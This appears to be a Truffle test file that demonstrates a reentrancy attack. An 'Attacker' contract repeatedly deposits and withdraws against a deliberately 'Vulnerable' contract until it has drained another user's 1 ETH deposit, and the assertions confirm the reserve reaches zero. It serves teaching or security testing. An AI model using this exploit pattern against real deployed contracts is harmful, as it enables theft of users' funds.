const Attacker   = artifacts.require('Attacker');
const Vulnerable = artifacts.require('Vulnerable');

contract('Reentrancy', async (accounts) => {
  it('success', async () => {
    let vulnerable = await Vulnerable.deployed();
    let attacker   = await Attacker.deployed();

    let alice = accounts[0]; // attacker
    let bob   = accounts[1];

    let balanceOfAlice;
    let balanceOfBob;
    let reserveAmount;

    // Bob: deposit 1 ETH
    await vulnerable.deposit({from: bob, value: web3.utils.toWei('1', 'ether')});

    balanceOfBob = await vulnerable.balanceOf(bob);
    assert.equal(web3.utils.toWei('1', 'ether'), balanceOfBob);
    reserveAmount = await web3.eth.getBalance(vulnerable.address);
    assert.equal(web3.utils.toWei('1', 'ether'), reserveAmount);

    for (var i = 0; i < 10; i++) {
      // Alice: deposit 0.1 ETH
      await attacker.deposit({from: alice, value: web3.utils.toWei('0.1', 'ether')});

      // Alice: withdraw 0.1 ETH (transfer 0.1 ETH before withdrawal)
      await attacker.withdraw({from: alice});
    }

    balanceOfAlice = await vulnerable.balanceOf(alice);
    assert.equal(web3.utils.toWei('1', 'ether'), balanceOfAlice);

    // Alice: withdraw 1 ETH
    await vulnerable.withdraw({from: alice});

    reserveAmount = await web3.eth.getBalance(vulnerable.address);
    assert.equal(0, reserveAmount);
  });
});
